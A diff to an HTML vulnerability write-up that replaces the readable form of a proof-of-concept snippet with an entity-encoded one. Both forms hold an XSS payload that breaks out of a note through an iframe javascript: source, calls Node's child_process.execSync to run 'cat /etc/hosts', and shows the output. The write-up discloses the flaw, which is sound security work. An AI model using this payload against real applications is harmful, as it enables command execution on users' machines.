@@ -182,17 +182,7 @@
         </ul>
 
         <h2>PoC Snippet</h2>
-        <pre class="code-green"><code>&lt;div&gt;
-  &lt;.a&lt;iframe src=javascript:
-    try {
-      const out = parent.parent.require('child_process')
-        .execSync('cat /etc/hosts');
-      alert(out.toString());
-    } catch(e) {
-      alert(e);
-    }
-  &gt;
-&lt;/div&gt;</code></pre>
+        <pre class="code-green"><code>&lt;div&gt;&NewLine;&lt;&period;a&lt;iframe src&equals;javascript&colon;try&lcub;top&period;alert&lpar;parent&period;parent&period;require&lpar;&apos;child&lowbar;process&apos;&rpar;&period;execSync&lpar;&apos;echo&bsol;x20&dollar;&lpar;cat&bsol;x20&sol;etc&sol;hosts&rpar;&apos;&rpar;&rpar;&rcub;catch&lpar;e&rpar;&lcub;top&period;alert&lpar;e&rpar;&rcub; &gt;</code></pre>
 
         <p>
           That payload abuses the “illegal tag” trick to break out of the note
